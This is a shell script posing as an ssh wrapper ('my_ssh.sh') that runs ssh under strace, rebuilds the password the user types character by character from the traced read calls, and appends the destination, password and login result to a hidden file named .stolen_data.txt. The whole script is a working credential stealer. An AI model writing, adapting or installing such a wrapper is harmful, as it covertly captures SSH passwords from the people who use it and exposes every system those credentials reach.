#!/usr/bin/expect -f
#####################################
# Help
#####################################
usage()
{
    echo "usage: my_ssh.sh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]"
    echo "           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]"
    echo "           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]"
    echo "           [-i identity_file] [-J [user@]host[:port]] [-L address]"
    echo "           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]"
    echo "           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]"
    echo "           [-w local_tun[:remote_tun]] destination [command]"

}

#################################################
#                 MAIN PROGRAM                 #
#################################################


#########  Set Vars  ############
destination="Destination"
str_to_compare="Dest"
num_of_args=$#
destination_arg=0
exi_status=-1
pass_flag=0
user_pass=""

i=0
exit_code=''
################################
if [ `expr $num_of_args` == 0 ]
then
    usage
    exit
fi

if [ `expr $num_of_args % 2` == 0 ]
then
    destination_arg=`expr $num_of_args - 1`
    #note: me to '!' vazei thn timh toy dld ${!num_of_args} to kanei $#
    destination=${!destination_arg}
else
    destination_arg=num_of_args
    destination=${!#} 
fi

### SSH invoke ###
strace -e trace=read,write -s 100 -f -o strace_result ssh "$@"

#strace -e trace=read,write -s 100 -f -o strace_result ssh $destination
#################

#read content of the file, search for the password
str_to_compare="$destination\'s password:"
while IFS=' ' read -r line # Set space as the delimiter
do
    if [[ "$line" == *$str_to_compare* ]] 
    then
        echo $line
        pass_flag=1;
        user_pass=""
        read -r line #read the next line
        #next lines contain user's pass, or at least the password he typed

    fi

    if [ $pass_flag == 1 ]
    then
        if [[ "$line" == *"read(5, \"\n\", 1)"* ]]  #And with that the password has been sent
        then
            pass_flag=0
        else
            for (( i = 0; i < ${#line}; ++i));do
                if [[ "${line:$i:1}" == "\"" ]] #if line[i]=='"'
                then
                    user_pass+="${line:$i+1:1}"      #then user_pass+= line[i+1]
                    break
                fi                    
            done

        fi
    fi
done < strace_result

#exit != 0 FAILED ATTEMPT
exit_code=$(tail -n 1 strace_result)
echo "Destination $destination" >> .stolen_data.txt
echo "Password $user_pass"      >> .stolen_data.txt
if [[ $exit_code == *"exited with 0"* ]]
then
    echo "Successful login attempt" >> .stolen_data.txt
else
    echo "Failed login attempt" >> .stolen_data.txt
fi
echo >> .stolen_data.txt
